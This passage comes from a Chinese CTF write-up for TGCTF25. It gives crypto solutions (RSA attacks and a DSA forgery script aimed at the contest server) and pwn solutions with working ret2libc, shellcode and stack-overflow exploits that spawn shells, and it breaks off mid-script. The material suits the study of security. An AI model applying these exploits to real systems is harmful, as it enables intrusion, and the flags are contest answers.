punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> ori_x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> ori_y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token comment\"># 按照公式坐标变换</span>\n                new_x <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">*</span> b <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> ori_x <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> ori_y<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> N\n                new_y <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> ori_x <span class=\"token operator\">+</span> ori_y<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> N\n                decode_image<span class=\"token punctuation\">[</span>new_x<span class=\"token punctuation\">,</span> new_y<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> image<span class=\"token punctuation\">[</span>ori_x<span class=\"token punctuation\">,</span> ori_y<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n        image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span>decode_image<span class=\"token punctuation\">)</span>\n        \n    <span class=\"token keyword\">return</span> image\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">arnold_brute</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span>shuffle_times_range<span class=\"token punctuation\">,</span>a_range<span class=\"token punctuation\">,</span>b_range<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>shuffle_times_range<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>shuffle_times_range<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>a_range<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a_range<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>b_range<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>b_range<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"[+] Trying shuffle_times=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> a=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>a<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> b=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                decoded_img <span class=\"token operator\">=</span> arnold_decode<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\n                output_filename <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"flag_decodedc</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">_a</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>a<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">_b</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png\"</span></span>\n                cv2<span class=\"token punctuation\">.</span>imwrite<span class=\"token punctuation\">(</span>output_filename<span class=\"token punctuation\">,</span> decoded_img<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>IMWRITE_PNG_COMPRESSION<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n                \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>imread<span class=\"token punctuation\">(</span><span class=\"token string\">\"cat.png\"</span><span class=\"token punctuation\">)</span>\n    arnold_brute<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><img src=\"/images/1745240699576-30.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699576-31.png\" alt=\"img\"></p>\n"},{"title":"TGCTF25 不知道 WP","date":"2025-04-14T12:07:39.000Z","typora-root-url":"./..","_content":"\n# 战队名：不知道\n\n**排名：3**\n\n![](/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png)\n\n## Crypto\n\n### AAAAAAAA·真·签到\n\nUGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}\n\n和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++\n\n```python\nenc='UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}'\n\ns='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nfor i in range(len(enc)):\n    if enc[i] in s:\n\n        ind=s.index(enc[i])\n        ind+=i-1\n        print(s[ind%26],end='')\n    else:\n        print(enc[i],end='')\n```\n\n> TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}\n\n### mm不躲猫猫\n\n给了60组n，c，n有公共因子gcd求得解密即可\n\n```python\nfrom Crypto.Util.number import *\n\ne = 65537\n\nn_list = []\nc_list = []\n\ncurrent_n = None\ncurrent_c = None\n\nwith open('E:\\\\wenjian\\\\p\\\\timu\\\\tgCTF\\\\cry\\\\challenge.txt', 'r') as f:\n    for line in f:\n        line = line.strip()\n        if line.startswith('[') and line.endswith(']'):\n            if current_n is not None and current_c is not None:\n                n_list.append(current_n)\n                c_list.append(current_c)\n                current_n = None\n                current_c = None\n        elif line.startswith('n = '):\n            current_n = int(line.split('=')[1].strip())\n        elif line.startswith('c = '):\n            current_c = int(line.split('=')[1].strip())\n    \n    if current_n is not None and current_c is not None:\n        n_list.append(current_n)\n        c_list.append(current_c)\n\nfor i in range(len(c_list)):\n    n=n_list[i]\n    other=n_list[:i] + n_list[i+1:]\n    p=None\n    for j in other:\n        if GCD(n,j)!=1:\n            p=GCD(n,j)\n            q=n//p\n            break\n    if p == None:\n        continue\n\n    d=inverse(e,(p-1)*(q-1))\n    print(long_to_bytes(pow(c_list[i],d,n)))\n```\n\n> TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}\n\n### RwSiAns\n\n```python\nfrom flag import FLAG\nfrom Crypto.Util.number import getPrime, bytes_to_long\nimport hashlib\n\ndef generate_key(bits=512):\n    p = getPrime(bits)\n    q = getPrime(bits)\n    return p * q, 3\n\ndef hash(x):\n    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)\n\ndef encrypt(m, n, e):\n    x1, x2 = 307, 7\n    c1 = pow(m + hash(x1), e, n)\n    c2 = pow(m + hash(x2), e, n)\n    return c1, c2\n\nm = bytes_to_long(FLAG)\nn, e = generate_key()\nc1, c2 = encrypt(m, n, e)\nprint(f\"n = {n}\")\nprint(f\"e = {e}\")\nprint(f\"c1 = {c1}\")\nprint(f\"c2 = {c2}\")\n\nn = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839\ne = 3\nc1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366\nc2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814\n```\n\n基础的相关信息攻击\n\n```python\nfrom Crypto.Util.number import *\nimport hashlib\n\ndef generate_key(bits=512):\n    p = getPrime(bits)\n    q = getPrime(bits)\n    return p * q, 3\n\ndef hash(x):\n    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)\n\n\ndef encrypt(m, n, e):\n    x1, x2 = 307, 7\n    c1 = pow(m + hash(x1), e, n)\n    c2 = pow(m + hash(x2), e, n)\n    return c1, c2\n\n\nn = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839\ne = 3\nc1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366\nc2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814\ns1=hash(307)\ns2=hash(7)\n\ndef franklinReiter(n,e,c1,c2):\n    PR.<x> = PolynomialRing(Zmod(n))\n    g1 = (x+s1)^e - c1\n    g2 = (x+s2)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nm=franklinReiter(n,e,c1,c2)\nprint(long_to_bytes(int(m)))\n```\n\n> TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}\n\n### 宝宝rsa\n\n```python\nfrom math import gcd\nfrom Crypto.Util.number import *\nfrom secret import flag\n\n# PART1\np1 = getPrime(512)\nq1 = getPrime(512)\nn1 = p1 * q1\nphi = (p1 - 1) * (q1 - 1)\nm1 = bytes_to_long(flag[:len(flag) // 2])\ne1 = getPrime(18)\nwhile gcd(e1, phi) != 1:\n    e1 = getPrime(17)\nc1 = pow(m1, e1, n1)\n\nprint(\"p1 =\", p1)\nprint(\"q1 =\", q1)\nprint(\"c1 =\", c1)\n\n# PART2\nn2 = getPrime(512) * getPrime(512)\ne2 = 3\nm2 = bytes_to_long(flag[len(flag) // 2:])\nc2 = pow(m2, e2, n2)\n\nprint(\"n2 =\", n2)\nprint(\"c2 =\", c2)\nprint(\"e2 =\", e2)\n```\n\nflag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e=3，n为1024位，m应该比较小直接开方即可\n\n```python\nfrom tqdm import tqdm\n\nphi1=(p1-1)*(q1-1)\nfor i in tqdm(range(2**18,2**16,-1)):\n    if gcd(i, phi1) != 1:\n        continue\n    d=inverse(i,phi1)\n    m1=long_to_bytes(pow(c1,d,p1*q1))\n    if b'TGCTF' in m1:\n        break\n\nprint(m1)\n\n# ---------------------------------------------------\nfrom gmpy2 import *\n\nm2=long_to_bytes(int(gmpy2.iroot(c2,3)[0]))\nprint(m2)\n\nprint(m1+m2)\n```\n\n> TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}\n\n### 费克特尔\n\n```python\nc=670610235999012099846283721569059674725712804950807955010725968103642359765806\nn=810544624661213367964996895060815354972889892659483948276203088055391907479553\ne=65537\n```\n\nn很小直接yafu分一下,有很多因子,正常解即可\n\n```python\nfrom Crypto.Util.number import *\n\nc=670610235999012099846283721569059674725712804950807955010725968103642359765806\nn=810544624661213367964996895060815354972889892659483948276203088055391907479553\ne=65537\n\np= [916848439436544911290378588839845528581,214168842768662180574654641, 2001511,18251 ,113 ]\nphi=1\nfor i in p:\n    phi*=(i-1)\n\nd=inverse(e,phi)\n\nprint(long_to_bytes(pow(c,d,n)))\n```\n\n> TGCTF{f4888_6abdc_9c2bd_9036bb}\n\n###  EZRSA\n\n```python\nfrom Crypto.Util.number import *\n\ndef genarate_emojiiiiii_prime(nbits, base=0):\n    while True:\n        p = getPrime(base // 32 * 32) if base >= 3 else 0\n        for i in range(nbits // 8 // 4 - base // 32):\n            p = (p << 32) + get_random_emojiiiiii() # 猜一猜\n        if isPrime(p):\n            return p\n\nm = bytes_to_long(flag.encode()+ \"\".join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())\np = genarate_emojiiiiii_prime(512, 224)\nq = genarate_emojiiiiii_prime(512)\n\nn = p * q\ne = \"💯\"\nc = pow(m, bytes_to_long(e.encode()), n)\n\nprint(\"p0 =\", long_to_bytes(p % 2 ** 256).decode())\nprint(\"n =\", n)\nprint(\"c =\", c)\n\np0 = '😘😾😂😋😶😾😳😷'\nn = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579\nc = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401\n```\n\n根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位\n\n题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可\n\n知道低32*9=288位即可copper得到p\n\ne和phi有公共因子，有限域开方crt遍历一下即可\n\n```python\nfrom Crypto.Util.number import *\n\np0_ = 108837065531980906150333850570890620719343963272506332719822248235755953428663\nn = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579\nc = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401\n\na=4036991100\n\nfrom tqdm import tqdm\nfor i in tqdm(range(100)):\n    PR.<x> = PolynomialRing(Zmod(n))\n    f = x * 2^288 + p0_ + (a+i)*2^256\n    f = f.monic()\n    roots = f.small_roots(X=2^225, beta=0.4,epsilon=0.04)\n\n    if roots:\n        x = roots[0]\n        p_candidate = int(x * 2^288 + p0_ + (a+i)*2^256)\n        if n % p_candidate == 0:\n            print(\"Found p:\", p_candidate)\n            q_candidate = n // p_candidate\n            break\n\nfrom gmpy2 import *\nfrom random import *\nfrom libnum import *\n\np=int(p_candidate)\nq=int(q_candidate)\ne=int(4036989615)\n\nprint(p,q,n%p,n%q)\n\nprint(GCD(e,(p-1)*(q-1)))\nprint(GCD(e,(p-1)))\nprint(GCD(e,(q-1)))\n\nd=inverse(e//GCD(e,(p-1)*(q-1)),(p-1)*(q-1))\nc=pow(c,d,n)\n\nR.<y>=Zmod(p)[]\nf=y^15-c\nf=f.monic()\nm1=f.roots()\n\nR.<z>=Zmod(q)[]\nf=z^15-c\nf=f.monic()\nm2=f.roots()\n\nfor i in m1:\n    for j in m2:\n        m=solve_crt([int(i[0]),int(j[0])],[int(p),int(q)])\n        print(long_to_bytes(int(m)))\n        if b'TGCTF' in long_to_bytes(int(m)):\n            print(long_to_bytes(int(m)).decode())\n```\n\n记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了\n\n> TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢\n\n### ****LLLCG****\n\n```python\nfrom hashlib import sha256\nfrom Crypto.Util.number import *\nfrom random import randint\nimport socketserver\nfrom secret import flag, dsa_p, dsa_q\n\nclass TripleLCG:\n    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):\n        self.state = [seed1, seed2, seed3]\n        self.a = a\n        self.b = b\n        self.c = c\n        self.d = d\n        self.n = n\n\n    def next(self):\n        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n\n        self.state.append(new)\n        return new\n\nclass DSA:\n    def __init__(self):\n        # while True:\n            # self.q = getPrime(160)\n            # t = 2 * getPrime(1024 - 160) * self.q\n            # if isPrime(t + 1):\n            #    self.p = t + 1\n            #    break\n        self.p = dsa_p\n        self.q = dsa_q\n        self.g = pow(2, (self.p - 1) // self.q, self.p)\n        self.x = randint(1, self.q - 1)\n        self.y = pow(self.g, self.x, self.p)\n\n    def sign(self, msg, k):\n        h = bytes_to_long(sha256(msg).digest())\n        r = pow(self.g, k, self.p) % self.q\n        s = (inverse(k, self.q) * (h + self.x * r)) % self.q\n        return (r, s)\n\n    def verify(self, msg, r, s):\n        if not (0 < r < self.q and 0 < s < self.q):\n            return False\n        h = bytes_to_long(sha256(msg).digest())\n        w = inverse(s, self.q)\n        u1 = (h * w) % self.q\n        u2 = (r * w) % self.q\n        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q\n        return v == r\n\nclass Task(socketserver.BaseRequestHandler):\n    def _recvall(self):\n        BUFF_SIZE = 2048\n        data = b''\n        while True:\n            part = self.request.recv(BUFF_SIZE)\n            data += part\n            if len(part) < BUFF_SIZE:\n                break\n        return data.strip()\n\n    def send(self, msg, newline=True):\n        if newline:\n            msg += b'\\n'\n        self.request.sendall(msg)\n\n    def recv(self, prompt=b'[-] '):\n        self.send(prompt, newline=False)\n        return self._recvall()\n\n    def handle(self):\n        n = getPrime(128)\n        a, b, c, d = [randint(1, n - 1) for _ in range(4)]\n        seed1, seed2, seed3 = [randint(1, n - 1) for _ in range(3)]\n\n        lcg = TripleLCG(seed1, seed2, seed3, a, b, c, d, n)\n        dsa = DSA()\n\n        self.send(b\"Welcome to TGCTF Challenge!\\n\")\n        self.send(f\"p = {dsa.p}, q = {dsa.q}, g = {dsa.g}, y = {dsa.y}\".encode())\n\n        small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]\n        used_messages = set()\n        for o_v in range(3):\n            self.send(b\"Select challenge parts: 1, 2, 3\\n\")\n            parts = self.recv().decode().split()\n\n            if '1' in parts:\n                self.send(b\"Part 1\\n\")\n                for i in range(12):\n                    self.send(f\"Message {i + 1}: \".encode())\n                    msg = self.recv()\n                    used_messages.add(msg)\n                    k = lcg.next()\n                    r, s = dsa.sign(msg, k)\n                    self.send(f\"r = {r}, ks = {[k % p for p in small_primes]}\\n\".encode())\n\n            if '2' in parts:\n                self.send(b\"Part 2\\n\")\n                for _ in range(307):\n                    k = lcg.next()\n                for i in range(10):\n                    self.send(f\"Message {i + 1}: \".encode())\n                    msg = self.recv()\n                    k = lcg.next() % dsa.q\n                    r, s = dsa.sign(msg, k)\n                    self.send(f\"Signature: r = {r}, s = {s}\\n\".encode())\n                    used_messages.add(msg)\n\n            if '3' in parts:\n                self.send(b\"Part 3\\n\")\n                self.send(b\"Forged message: \")\n                final_msg = self.recv()\n                self.send(b\"Forged r: \")\n                r = int(self.recv())\n                self.send(b\"Forged s: \")\n                s = int(self.recv())\n\n                if final_msg in used_messages:\n                    self.send(b\"Message already signed!\\n\")\n                elif dsa.verify(final_msg, r, s):\n                    self.send(f\"Good! Your flag: {flag}\\n\".encode())\n                else:\n                    self.send(b\"Invalid signature.\\n\")\n```\n\n分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list\n\n9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值\n\n现在相当于拥有12组k,根据12组k逆向lcg即可\n\n使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x\n\n然后伪造签名即可\n\n```python\nfrom pwn import *\nfrom Crypto.Util.number import *\nfrom hashlib import sha256\n\nsh=remote(\"node1.tgctf.woooo.tech\",31104)\ncontext.log_level='debug'\n\nsmall_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]\n\nclass TripleLCG:\n    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):\n        self.state = [seed1, seed2, seed3]\n        self.a = a\n        self.b = b\n        self.c = c\n        self.d = d\n        self.n = n\n\n    def next(self):\n        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n\n        self.state.append(new)\n        return new\n\nclass DSA:\n    def __init__(self):\n        # while True:\n            # self.q = getPrime(160)\n            # t = 2 * getPrime(1024 - 160) * self.q\n            # if isPrime(t + 1):\n            #    self.p = t + 1\n            #    break\n        self.p = dsa_p\n        self.q = dsa_q\n        self.g = pow(2, (self.p - 1) // self.q, self.p)\n        self.x = randint(1, self.q - 1)\n        self.y = pow(self.g, self.x, self.p)\n\n    def sign(self, msg, k):\n        h = bytes_to_long(sha256(msg).digest())\n        r = pow(self.g, k, self.p) % self.q\n        s = (inverse(k, self.q) * (h + self.x * r)) % self.q\n        return (r, s)\n\n    def verify(self, msg, r, s):\n        if not (0 < r < self.q and 0 < s < self.q):\n            return False\n        h = bytes_to_long(sha256(msg).digest())\n        w = inverse(s, self.q)\n        u1 = (h * w) % self.q\n        u2 = (r * w) % self.q\n        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q\n        return v == r\n# -------------------------------------------------\n# get pqgy\n\nsh.recvuntil(b'!\\n')\nsh.recvuntil(b'\\n')\n\nsh.recvuntil(b'p = ')\np=int(sh.recvuntil(b',').decode()[:-1])\nprint('p = ',p)\nsh.recvuntil(b'q = ')\nq=int(sh.recvuntil(b',').decode()[:-1])\nprint('q = ',q)\nsh.recvuntil(b'g = ')\ng=int(sh.recvuntil(b',').decode()[:-1])\nprint('g = ',g)\nsh.recvuntil(b'y = ')\ny=int(sh.recvuntil(b'\\n').decode()[:-1])\nprint('y = ',y)\n\nprint('----------------------------------------------------')\n# part 1\nsh.recvuntil(b'] ')\nsh.sendline(b'1')\nr_l=[]\nks_l=[]\nfor i in range(12):\n    sh.recvuntil(b'] ')\n    sh.sendline(b'1')\n    sh.recvuntil(b'r = ')\n    r=int(sh.recvuntil(b',').decode()[:-1])\n    print('r = ',r)\n    sh.recvuntil(b'ks = ')\n    ks=eval(sh.recvuntil(b'\\n').decode()[:-1])\n    print('ks = ',ks)\n    r_l.append(r)\n    ks_l.append(ks)\n\nprint(r_l,ks_l)\n\nfrom libnum import *\ndef recover_k(residues):    \n    return solve_crt(residues,small_primes)\n\nk_ = [recover_k(i) for i in ks_l]\nprint(k_)\n\n#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]\n\nR.<a,b,c,d> = PolynomialRing(ZZ)\n\nf1=k_[0]*a+k_[1]*b+k_[2]*c+d-k_[3]\nf2=k_[1]*a+k_[2]*b+k_[3]*c+d-k_[4]\nf3=k_[2]*a+k_[3]*b+k_[4]*c+d-k_[5]\nf4=k_[3]*a+k_[4]*b+k_[5]*c+d-k_[6]\nf5=k_[4]*a+k_[5]*b+k_[6]*c+d-k_[7]\nf6=k_[5]*a+k_[6]*b+k_[7]*c+d-k_[8]\nf7=k_[6]*a+k_[7]*b+k_[8]*c+d-k_[9]\nf8=k_[7]*a+k_[8]*b+k_[9]*c+d-k_[10]\nf9=k_[8]*a+k_[9]*b+k_[10]*c+d-k_[11]\n\nF=[f1,f2,f3,f4,f5,f6,f7,f8,f9]\nideal = Ideal(F)\n\nI = ideal.groebner_basis()\nprint(I)\nn = int(I[4])\na = int(-I[0].univariate_polynomial()(0))%n\nb = int(-I[1].univariate_polynomial()(0))%n\nc = int(-I[2].univariate_polynomial()(0))%n\nd = int(-I[3].univariate_polynomial()(0))%n\n\nprint(a,b,c,d,n)\nprint(a.bit_length(),b.bit_length(),c.bit_length(),d.bit_length(),n.bit_length())\n\nlcg=TripleLCG(k_[-3],k_[-2],k_[-1],a,b,c,d,n)\n\nprint('--------------------------------------------------')\n#part 2\n\nsh.recvuntil(b'] ')\nsh.sendline(b'2')\nsh.recvuntil(b' 2\\n')\n\nfor _ in range(307):\n    k = lcg.next()\n\nr_l2 = []\ns_l = []\n\nfor i in range(10):\n    sh.recvuntil(b'] ')\n    sh.sendline(b'a')\n\n    sh.recvuntil(b'r = ')\n    r=int(sh.recvuntil(b',').decode()[:-1])\n    print('r = ',r)\n    sh.recvuntil(b's = ')\n    s=int(sh.recvuntil(b'\\n').decode()[:-1])\n    print('s = ',s)\n\n    r_l2.append(r)\n    s_l.append(s)\nprint(r_l2,s_l)\nprint(len(r_l2),len(s_l))\n\nm = b'a'\nh = bytes_to_long(sha256(m).digest())\nk = lcg.next()\nprint('k=',k)\ninv_r=inverse(r_l2[0],q)\nx = ((s_l[0]*k%q-h)*inv_r) % q\nprint(x)\n\nprint(\"------------------------------------------\")\n#part 3\n\nsh.recvuntil(b'] ')\nsh.sendline(b'3')\n\nend_m=b'b'\nsh.recvuntil(b'e: ')\nsh.sendline(end_m)\n\nend_h = bytes_to_long(sha256(b'b').digest())\nr_ = pow(g,1,p)%q\ns_ = ((end_h+x*r_)*inverse(1,q))%q\nprint(r_,s_)\n\nsh.recvuntil(b'r: ')\nsh.sendline(str(r_).encode())\nsh.recvuntil(b's: ')\nsh.sendline(str(s_).encode())\nsh.recvlines()\n\nsh.interactive()\n```\n\n![img](/images/1744633170180-60.png)\n\n## Pwn\n\n### 签到\n\n栈溢出，打ret2libc。\n\n```python\nfrom pwn import *\n\nio=process(\"./pwn\")\nlibc=ELF(\"libc.so.6\")\n\nplt=0x0401060\ngot=0x0404018\nrdi=0x0401176\nstart=0x0401090\nret=0x040101a\n\np=b\"A\"*120+p64(rdi)+p64(got)+p64(plt)+p64(start)\nio.sendlineafter(\"name.\", p)\nlibc.address=u64(io.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\"))-libc.sym[\"puts\"]\nprint(hex(libc.address))\n\np=b\"A\"*120+p64(ret)+p64(rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym[\"system\"])\nio.sendlineafter(\"name.\", p)\n\nio.interactive()\n```\n\n### shellcode\n\nShellcode 限制0x12 大小，不能在mmap可执行区域二次写。\n\n所有寄存器都被清空了，除了rdi为mmap可执行区域。\n\n改eax成execve系统调用，之后再加rdi到写入/bin/sh的偏移，最后syscall去拿shell。\n\neax省2字节\n\n```python\nfrom pwn import *\n\ncontext.arch=\"amd64\"\n\nio = process(\"./pwn\")\n\nsc=asm('''\nmov eax, 0x3b\nadd rdi, 0xb\nsyscall\n''')+b\"/bin/sh\"\n\nprint(len(sc))\nio.send(sc)\n\nio.interactive()\n```\n\n### stack\n\n第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。\n\n![img](/images/1744633170177-2.png)\n\nsub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。\n\n![img](/images/1744633170177-3.png)\n\n第一次写可以溢出到这些位置来改变syscall，伪造成execve(\"/bin/sh\", 0, 0)。\n\n```python\nfrom pwn import *\n\nio=process(\"./pwn\")\n\np=b\"A\"*64+p64(0x3b)+p64(0x0404108)+p64(0)*2\nio.sendafter(\"name?\", p)\nio.sendafter(\"say?\", b\"A\"*0x50)\n\nio.interactive()\n```\n\n### overflow\n\nx86 静态编译，有栈溢出。\n\n![img](/images/1744633170177-4.png)\n\n返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。\n\n```python\nfrom pwn import *\n\nio=process(\"./pwn\")\ncontext.terminal = [\"tmux\", \"splitw\", 